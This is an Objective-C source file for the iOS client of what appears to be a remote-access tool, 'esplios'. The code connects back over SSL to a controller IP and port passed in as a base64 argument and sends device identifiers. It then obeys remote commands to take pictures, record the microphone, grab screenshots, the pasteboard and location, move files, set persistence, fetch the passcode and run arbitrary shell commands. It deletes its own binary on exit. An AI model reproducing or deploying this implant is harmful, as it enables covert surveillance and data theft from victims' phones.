//
//  main.m
//  esplios
//
//  Created by Lucas Jackson on 8/6/17.
//  Copyright © 2017 neoneggplant. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "espl.h"

int sockfd, newsockfd;
SSL_CTX *ssl_client_ctx;
SSL *client_ssl;
struct sockaddr_in serverAddress;

NSArray *rocketCommands = [[NSArray alloc] initWithObjects:
    @"play",
    @"pause", 
    @"next", 
    @"prev", 
    @"home", 
    @"doublehome", 
    @"lock", 
    @"wake",
    @"mute",
    @"unmute",
    @"locationon",
    @"locationoff",nil];

NSArray *rocketReplyCommands = [[NSArray alloc] initWithObjects:
    @"ismuted",
    @"getpasscode",
    @"unlock",
    @"lastapp",
    @"islocked",nil];

void connectToServer(NSDictionary *arguments);
void interact(NSDictionary *arguments);

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        NSData *argData = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%s", argv[1]] options:0];
        NSString *json = [[NSString alloc] initWithData:argData encoding:NSUTF8StringEncoding];
        NSData *jsonData = [json dataUsingEncoding:NSUTF8StringEncoding];
        NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
        connectToServer(jsonDict);
    }
    //delete self after connection close`
    remove(argv[0]);
    return 0;
}

void DestroySSL() {
    ERR_free_strings();
    EVP_cleanup();
}

void ShutdownSSL() {
    SSL_shutdown(client_ssl);
    SSL_free(client_ssl);
}

NSString *getFullCMD(NSDictionary *dict) {
    NSString *result = [dict objectForKey:@"cmd"];
    if ([dict objectForKey:@"args"]) {
        result = [NSString stringWithFormat:@"%@ %@",result,[dict objectForKey:@"args"]];
    }
    result = [NSString stringWithFormat:@"%@\n",result];
    NSLog(@"result = %@\n",result);
    return result;
}

void connectToServer(NSDictionary *arguments) {
    if (!arguments) {
        return;
    }
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    ssl_client_ctx = SSL_CTX_new(SSLv23_client_method());
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serverAddress.sin_family = AF_INET;
    inet_aton([[arguments objectForKey:@"ip"] UTF8String], &serverAddress.sin_addr);
    serverAddress.sin_port = htons([[arguments objectForKey:@"port"] integerValue]);
    printf("%s","Connecting...\n");
    if (connect(sockfd,(struct sockaddr *)&serverAddress,sizeof(serverAddress)) < 0) {
        printf("%s","connection failed\n");
        return;
    } else {
        printf("%s","connection successfull\n");
    }
    client_ssl = SSL_new(ssl_client_ctx);
    if(!client_ssl) {
        printf("Client Failed\n");
        return;
    }
    SSL_set_fd(client_ssl, sockfd);
    if(SSL_connect(client_ssl) != 1) {
        printf("Handshake Failed\n");
        return;
    }
    
    //Send device name
    NSDictionary *deviceInfo = [[NSMutableDictionary alloc] init];
    [deviceInfo setValue:NSUserName() forKey:@"username"];
    [deviceInfo setValue:[[UIDevice currentDevice] name] forKey:@"hostname"];
    [deviceInfo setValue:[[[UIDevice currentDevice] identifierForVendor] UUIDString] forKey:@"uid"];
    [deviceInfo setValue:NSHomeDirectory() forKey:@"current_directory"];
    [deviceInfo setValue:@"iOS" forKey:@"type"];
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:deviceInfo options:0 error:nil];
    NSString *jsonString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
    SSL_write(client_ssl, [jsonString UTF8String], (int)strlen([jsonString UTF8String]));
    interact(arguments);
}


void interact(NSDictionary *arguments) {
    espl *esCommand = [[espl alloc] init];
    esCommand->client_ssl = client_ssl;
    
    //listen for input data
    char buffer[2048] = "";
    while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
        NSData *jsonData = [[NSString stringWithFormat:@"%s",buffer] dataUsingEncoding:NSUTF8StringEncoding];
        NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:NULL];
        NSString *cmd = [jsonDict objectForKey:@"cmd"];
        NSString *args = [jsonDict objectForKey:@"args"];
        esCommand->terminator = (char*)[[jsonDict objectForKey:@"term"] UTF8String];
        [esCommand debugLog:[NSString stringWithFormat:@"%@",jsonDict]];
        if ([cmd isEqualToString:@"alert"]) {
            [esCommand showAlert:args];
        } else if ([cmd isEqualToString:@"picture"]) {
            [esCommand takePicture:[args boolValue]];
        } else if ([cmd isEqualToString:@"download"]) {
            [esCommand sendFile:args];
        } else if ([cmd isEqualToString:@"getpaste"]) {
            [esCommand getPasteBoard];
        } else if ([cmd isEqualToString:@"persistence"]) {
            NSString *ip = [arguments objectForKey:@"ip"];
            int port = [[arguments valueForKey:@"port"] intValue];
            [esCommand persistence:args:ip:port];
        } else if ([cmd isEqualToString:@"timestamp"]) {
            printf("%s\n","manipulate timestamp on a file");
        } else if ([cmd isEqualToString:@"cd"]) {
            [esCommand changeDirectory:args];
        } else if ([cmd isEqualToString:@"mic"]) {
            [esCommand mic:args];
        } else if ([cmd isEqualToString:@"pid"]) {
            [esCommand getProcessId];
        } else if ([cmd isEqualToString:@"upload"]) {
            [esCommand receiveFile:args];
        } else if ([cmd isEqualToString:@"killtask"]) {
            [esCommand killTask];
        } else if ([cmd isEqualToString:@"screenshot"]) {
            [esCommand screenshot];
        } else if ([cmd isEqualToString:@"tab_complete"]) {
            [esCommand tabComplete:args];
        } else if ([cmd isEqualToString:@"ls"]) {
            [esCommand listDirectory:args];
        } else if ([cmd isEqualToString: @"battery"]) {
            [esCommand getBattery];
        } else if ([cmd isEqualToString: @"vibrate"]) {
            [esCommand vibrate];
        } else if ([cmd isEqualToString: @"getvol"]) {
            [esCommand getVolume];
        } else if ([cmd isEqualToString:@"setvol"]) {
            [esCommand setVolume:args];
        } else if ([cmd isEqualToString: @"bundleids"]) {
            [esCommand bundleIds];
        } else if ([cmd isEqualToString: @"locate"]) {
            [esCommand locate];
        } else if ([cmd isEqualToString: @"pid"]) {
            [esCommand getPid];
        } else if ([cmd isEqualToString:@"ipod"]) {
            [esCommand ipod:args];
        } else if ([cmd isEqualToString:@"openurl"]) {
            [esCommand openURL:args];
        } else if ([cmd isEqualToString:@"open"]) {
            [esCommand openApp:args];
        } else if ([cmd isEqualToString:@"say"]) {
            [esCommand say:args];
        } else if ([cmd isEqualToString:@"sysinfo"]) {
            [esCommand sysinfo];
        } else if ([cmd isEqualToString:@"exit"]) {
            printf("%s\n","exit program");
            [esCommand killTask];
            exit(1);
        } else if ([rocketCommands containsObject:cmd]) {
            [esCommand rocketMC:cmd];
        } else if ([rocketReplyCommands containsObject:cmd]) {
            [esCommand rocketMCWithReply:cmd];
        } else if (jsonDict != NULL) {
            [esCommand runTask:getFullCMD(jsonDict):true];
        }
        memset(buffer,'\0',2048);
    }
    [esCommand debugLog:[NSString stringWithFormat:@"exit"]];
}
